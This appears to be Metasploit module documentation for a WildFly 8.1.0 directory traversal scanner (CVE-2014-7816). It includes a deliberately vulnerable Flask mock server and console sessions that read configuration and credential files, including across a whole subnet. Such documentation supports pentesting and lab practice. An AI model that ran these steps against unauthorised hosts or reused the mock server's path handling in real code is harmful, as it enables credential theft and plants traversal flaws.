## Vulnerable Application

This module exploits a directory traversal vulnerability (CVE-2014-7816) found in WildFly 8.1.0.Final web server running on port 8080, named JBoss Undertow. The vulnerability only affects Windows systems and allows an attacker to read arbitrary files from the server filesystem.

The vulnerability exists in the path normalization logic of Undertow when running on Windows, allowing the use of backslashes to traverse directories.

### Installation

You can set up a vulnerable WildFly server using Docker on a Windows host, or simulate the behavior with a custom server:

```bash
# For testing on Windows, download WildFly 8.1.0.Final
# Download from: https://download.jboss.org/wildfly/8.1.0.Final/wildfly-8.1.0.Final.zip

# Extract and run
unzip wildfly-8.1.0.Final.zip
cd wildfly-8.1.0.Final/bin
standalone.bat

# For Linux testing (simulated vulnerable behavior), create a mock server:
mkdir -p wildfly_vuln
cd wildfly_vuln

cat > server.py << 'EOF'
from flask import Flask, request, send_file
import os

app = Flask(__name__)

@app.route('/<path:path>')
def serve(path):
    # Simulate vulnerable path traversal on Windows
    if '..' in path and '\\' in path:
        # Extract the file path after traversal
        file_path = path.replace('..\\', '../')
        file_path = file_path.replace('\\', '/')
        try:
            if os.path.exists(file_path):
                headers = {
                    'Server': 'WildFly/8',
                    'X-Powered-By': 'Undertow/1',
                    'Content-Type': 'text/xml'
                }
                return send_file(file_path), 200, headers
        except:
            pass
    return "Not Found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
EOF

# Create a sample configuration file to retrieve
mkdir -p standalone/configuration
cat > standalone/configuration/standalone.xml << 'EOF'
<?xml version='1.0' encoding='UTF-8'?>
<server xmlns="urn:jboss:domain:2.1">
    <extensions>
        <extension module="org.jboss.as.clustering.infinispan"/>
    </extensions>
    <management>
        <security-realms>
            <security-realm name="ManagementRealm">
                <authentication>
                    <local default-user="$local" skip-group-loading="true"/>
                    <properties path="mgmt-users.properties" relative-to="jboss.server.config.dir"/>
                </authentication>
            </security-realm>
        </security-realms>
    </management>
</server>
EOF

# Run the server
python3 server.py
```

Using Docker:

```bash
cat > Dockerfile << 'EOF'
FROM python:3.9-slim
WORKDIR /app
RUN pip install flask
COPY server.py .
RUN mkdir -p standalone/configuration
COPY standalone/configuration/standalone.xml standalone/configuration/
EXPOSE 8080
CMD ["python", "server.py"]
EOF

docker build -t wildfly-vuln .
docker run -d -p 8080:8080 --name wildfly wildfly-vuln
```

## Verification Steps

1. Install and configure the vulnerable WildFly server as described above
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/wildfly_traversal`
4. Do: `set RHOSTS [IP]`
5. Do: `run`
6. You should see the module download the specified file

## Options

**RHOSTS**

The target address range or CIDR identifier

**RPORT**

The target port (default: 8080)

**RELATIVE_FILE_PATH**

Relative path to the file to read (default: `standalone\configuration\standalone.xml`)

**TRAVERSAL_DEPTH**

Number of directory levels to traverse (default: 1)

**THREADS**

The number of concurrent threads (default: 1)

## Scenarios

### Exploiting the Vulnerability to Read Configuration Files

```
msf6 > use auxiliary/scanner/http/wildfly_traversal
msf6 auxiliary(scanner/http/wildfly_traversal) > set RHOSTS 192.0.2.10
RHOSTS => 192.0.2.10
msf6 auxiliary(scanner/http/wildfly_traversal) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/http/wildfly_traversal) > run

[*] Attempting to download: standalone\configuration\standalone.xml
[+] File saved in: /home/user/.msf4/loot/20261006123045_default_192.0.2.10_wildfly.http_445678.xml
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Reading a Different File with Custom Depth

```
msf6 auxiliary(scanner/http/wildfly_traversal) > set RHOSTS 192.0.2.10
RHOSTS => 192.0.2.10
msf6 auxiliary(scanner/http/wildfly_traversal) > set RELATIVE_FILE_PATH standalone\configuration\mgmt-users.properties
RELATIVE_FILE_PATH => standalone\configuration\mgmt-users.properties
msf6 auxiliary(scanner/http/wildfly_traversal) > set TRAVERSAL_DEPTH 2
TRAVERSAL_DEPTH => 2
msf6 auxiliary(scanner/http/wildfly_traversal) > run

[+] File saved in: /home/user/.msf4/loot/20261006123145_default_192.0.2.10_wildfly.http_889921.properties
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Scanning Multiple Hosts

```
msf6 auxiliary(scanner/http/wildfly_traversal) > set RHOSTS 192.0.2.0/24
RHOSTS => 192.0.2.0/24
msf6 auxiliary(scanner/http/wildfly_traversal) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/http/wildfly_traversal) > run

[+] 192.0.2.10:8080 - File saved in: /home/user/.msf4/loot/20261006123245_default_192.0.2.10_wildfly.http_112233.xml
[+] 192.0.2.15:8080 - File saved in: /home/user/.msf4/loot/20261006123246_default_192.0.2.15_wildfly.http_445566.xml
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Failed Exploitation Attempt

```
msf6 auxiliary(scanner/http/wildfly_traversal) > set RHOSTS 192.0.2.50
RHOSTS => 192.0.2.50
msf6 auxiliary(scanner/http/wildfly_traversal) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/http/wildfly_traversal) > run

[*] Attempting to download: standalone\configuration\standalone.xml
[-] Nothing was downloaded
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
